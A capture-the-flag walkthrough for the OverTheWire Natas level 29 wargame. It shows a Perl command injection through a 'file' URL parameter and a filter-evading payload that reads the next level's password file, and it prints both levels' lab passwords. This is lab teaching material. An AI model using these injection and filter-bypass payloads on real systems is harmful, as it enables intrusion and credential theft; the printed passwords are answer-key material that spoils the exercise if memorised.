# Natas29 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas29
Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
URL:      http://natas29.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- Here, we have Perl RCE. Endpoint `index.perl?file=` is vulnerable to RCE and you can confirm it with `|ls%00`.

  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas29/test.png"/>

- Now we just have to read the password. Here's the payload: `|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27`.

  ```
  # --------------------------------------
  # PAYLOAD EXPLANATION:
  # Remote Command Execution (RCE) is possible via the "file" parameter
  # however, there’s input sanitization (e.g., blocking semicolons, slashes, etc.)
  # so evade filters using:
  # - "%22" for double quotes
  # - broken-up file path using string concatenation
  # - "+" in place of spaces (URL-safe)
  # - "tr" to replace newline with space for clean output
  # --------------------------------------
  ```

  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas29/pw.png"/>

- You can also do it with scripting. Additional details are in the script.

  ```
  $ python3 natas30-perlRCE.py  
  WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH 
  ```

---

## 🏁 Password for the next level

`Password for natas30 is: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
